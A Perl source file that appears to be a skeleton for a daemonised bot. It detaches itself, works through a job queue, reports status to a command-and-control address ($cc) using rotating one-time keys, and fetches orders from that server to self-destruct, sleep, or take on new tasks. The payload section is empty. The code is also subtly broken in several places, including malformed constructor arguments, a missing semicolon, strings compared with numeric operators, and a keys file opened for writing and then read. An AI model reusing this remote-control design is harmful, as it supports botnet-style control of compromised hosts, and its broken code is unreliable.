#!/usr/local/bin/perl
use strict; use warnings;
use Proc::Daemon;
use LWP::UserAgent; use IO::Socket;
###############
# SUMMON SCROLL
###############
# NAME - purpose
# EMBRYO ##############################
my $name = ''; my $cc = '';
my $DONE = 'DONE'; my $dump = 'dump';
my $home = '/home/hive/$name'; my $HOLE = 'HOLE';
my $BUG = 'BUG'; my $LOG = 'LOG'; my $REP = 'REP';
my $PID = 'PID'; my $que = 'que'; my @FACE;
my $POST = 'POST'; my $WORD = 'WORD';
my $SLEEP  = 'SLEEP'; my $SUICIDE = 'SUICIDE';
my $RATE = '100'; my $KEYS = 'KEYS';
mkdir $home or die "home FAIL\n"; mkdir $que or die "que FAIL\n";
mkdir $dump or die "dump FAIL\n";
# BIRTH ###############################
my $embryo = Proc::Daemon->new(
  work_dir => $home,
  child_STDOUT = "+>>$LOG",
  child_STDERR = "+>>$BUG",
  child_STDIN = $HOLE,
  pid_file = $PID
);
$embryo->Init() or die "STILLBORN\n";
# INHERIT ############################
# FACE (age, name, rep, status)
my $born = gmtime();
my $btime = TIME(); print "HELLOWORLD $btime\n";
$FACE[1] = $name;
# LIVE ###############################
while (1)
{
  @ls = `ls que`; my $QUE = @ls[0];
  open($qfh, '<', "que/$QUE");
  my @QUE = readline $qfh; chomp @QUE;
  close $qfh; unlink $QUE;
  unless (defined $QUE[1])
    { sleep 3600; }
  my $stime = TIME(); print "start $stime\n";
  my $variable = shift; print "variable $variable\n";
  my $count = @QUE; print "count $count\n"; my $ttl = $count;
  foreach my $i (@QUE)
  {
    if (-e $SUICIDE)
      { SUICIDE(); }
    if (-e $SLEEP)
      { SLEEP(); }
    print "started $i\n";
#######################################################################
## CODE #############################

#######################################################################
## CLEAN ############################
    shift @QUE; $count--;
    print "ended $i\n"; print "count $count\n";
    if ($count % $RATE == 0)
    {
# RATE ##############################
      my $current = gmtime();
      $FACE[0] = (($current - $born) / 60);
      open($Rfh, '<', $REP); $FACE[2] = readline $Rfh;
      $FACE[3] = $variable . '_' . $count . '/' . $ttl;
      POST(@FACE);
      WORD(); Wread();
    }
  }
  my $dtime = TIME(); print "done $dtime\n";
  open($Wfh, '>', $DONE);
}
# SUB ##############################
sub SUICIDE()
{
  unlink $SUICIDE;
  my $xtime = TIME(); print "FKTHEWORLD $xtime\n";
  exit;
}
sub SLEEP()
{
  open(my $Sfh, '<', $SLEEP);
  my $timeout = readline $Sfh; chomp $timeout;
  my $ztime = TIME(); print "sleep $ztime $timeout\n";
  close $Sfh; unlink $SLEEP;
  sleep $timeout;
}
sub TIME()
{
  my $t = localtime;
  my $m = split(/\s+/, $t)[1]; my $d = split(/\s+/, $t)[2];
  my $H = split(/\s+/, $t)[3]; my $h = split(/\:/, $H)[0];
  my $time = $m . '_' . $d . '_' . $h;
  return $time;
}
sub POST()
{
  my $data = shift; my $key = popkrip();
  my $ua = useragent();
  my $req = HTTP::Request->new(POST => $cc/$key)
  $req->content($data);
  print "response $ua->request($req)->as_string\n";
}
sub WORD()
{
  my $key = popkrip(); my $ua = useragent();
  my $res = $ua->get("$cc/i/$key", ':content_file'=>$WORD);
}
sub Wread()
{
  my $key = shift;
  open($Rfh, '<', "$dump/$key");
  my @cmds = readline $Rfh; chomp @cmds; close $Rfh;
  my $cmd = @cmds[0]; my $value = @cmds[1];
# (suicide, $boolean) (sleep, $x) (append, $WORD) (orders, $WORD)
  if ($cmd == 'suicide' && $value == '1')
    { SUICIDE(); }
  if ($cmd == 'sleep')
    { open($Sfh, '>', $SLEEP); print "$Sfh" "$value"; close $Sfh; SLEEP(); }
  if ($cmd == 'append')
  {
    open(my $Wfh, '<', $WORD);
    my @aQUE = readline $Wfh;
    chomp @aQUE; close $Wfh;
    foreach (@aQUE)
      { push @QUE, $_; }
  }
  if ($cmd == 'orders')
    { cp $WORD que/$value; }
}
sub popkrip()
{
  open($Kfh, '>', $KEYS);
  my @list = readline $Kfh; chomp @list;
  my $key = shift @list; print $Kfh @list;
  close $Kfh; return $key;
}
sub useragent()
{
  my $ua = LWP::UserAgent->new(
# AGENT ##########################
  );
  return $ua;
}
